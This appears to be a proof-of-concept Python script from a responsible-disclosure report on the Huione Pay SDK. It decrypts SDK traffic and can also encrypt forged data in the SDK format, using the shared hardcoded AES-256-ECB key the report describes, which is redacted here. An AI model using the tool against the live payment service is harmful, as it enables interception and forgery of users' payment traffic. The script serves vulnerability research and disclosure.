#!/usr/bin/env python3
"""
aes_decryptor.py - Decrypt Huione Pay SDK traffic (Research Tool)
==================================================================
Demonstrates the AES-256-ECB encryption scheme used in Huione Pay SDK.

Vulnerability: Hardcoded symmetric encryption key found via static analysis
of AbstractC0229a.java (line 1018). Key is identical across all app instances.

Reference: VULNERABILITY_REPORT.md - Finding #1 (CVSS 9.8)

SECURITY NOTE:
  The actual encryption key has been redacted from this public release.
  The key was extracted via Frida instrumentation and static binary analysis.
  Full technical details provided to vendor under responsible disclosure.

Usage (conceptual):
  Set HUIONE_AES_KEY environment variable to the extracted key, then:
  python aes_decryptor.py "encoded_data"
  python aes_decryptor.py --encrypt "plaintext"
"""

import argparse
import sys
import base64
import os
from urllib.parse import quote, unquote

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[ERROR] pycryptodome required: pip install pycryptodome", file=sys.stderr)
    sys.exit(1)

# Key is loaded from environment variable - NOT hardcoded in public release
# Set this to the extracted key when using for authorized security testing
_key_env = os.environ.get("HUIONE_AES_KEY", "")
if not _key_env:
    print("[ERROR] Set HUIONE_AES_KEY environment variable before use.", file=sys.stderr)
    print("        Example: set HUIONE_AES_KEY=<extracted_key>", file=sys.stderr)
    sys.exit(1)

HUIONE_AES_KEY = _key_env.encode("utf-8")[:32].ljust(32, b'\x00')
AES_MODE = AES.MODE_ECB
BLOCK_SIZE = 16


def decrypt_sdk(encoded_data: str, key: bytes = HUIONE_AES_KEY) -> str:
    """
    Decrypt Huione SDK data.
    Pipeline: URL decode → Base64 decode → AES/ECB/PKCS7 decrypt
    """
    url_decoded = unquote(encoded_data.strip())
    try:
        ciphertext = base64.b64decode(url_decoded)
    except Exception as e:
        raise ValueError(f"Base64 decode failed: {e}")

    cipher = AES.new(key, AES_MODE)
    try:
        plaintext = unpad(cipher.decrypt(ciphertext), BLOCK_SIZE)
    except ValueError:
        plaintext = cipher.decrypt(ciphertext).rstrip(b'\x00')

    return plaintext.decode("utf-8", errors="replace").strip()


def encrypt_sdk(plaintext: str, key: bytes = HUIONE_AES_KEY) -> str:
    """
    Encrypt data in Huione SDK format.
    Pipeline: AES/ECB/PKCS7 encrypt → Base64 encode → URL encode
    """
    cipher = AES.new(key, AES_MODE)
    padded = pad(plaintext.encode("utf-8"), BLOCK_SIZE)
    ciphertext = cipher.encrypt(padded)
    return quote(base64.b64encode(ciphertext).decode("ascii"), safe="")


def main():
    parser = argparse.ArgumentParser(
        description="Huione Pay AES-256-ECB Research Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("data", nargs="?", help="Data to process")
    parser.add_argument("--encrypt", "-e", action="store_true", help="Encrypt mode")
    parser.add_argument("--file", "-f", help="Read input from file")
    parser.add_argument("--output", "-o", help="Write output to file")

    args = parser.parse_args()

    if args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            input_data = f.read().strip()
    elif args.data:
        input_data = args.data
    else:
        parser.print_help()
        sys.exit(1)

    try:
        result = encrypt_sdk(input_data) if args.encrypt else decrypt_sdk(input_data)
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        sys.exit(1)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(result)
        print(f"[*] Output written to: {args.output}")
    else:
        print(result)


if __name__ == "__main__":
    main()
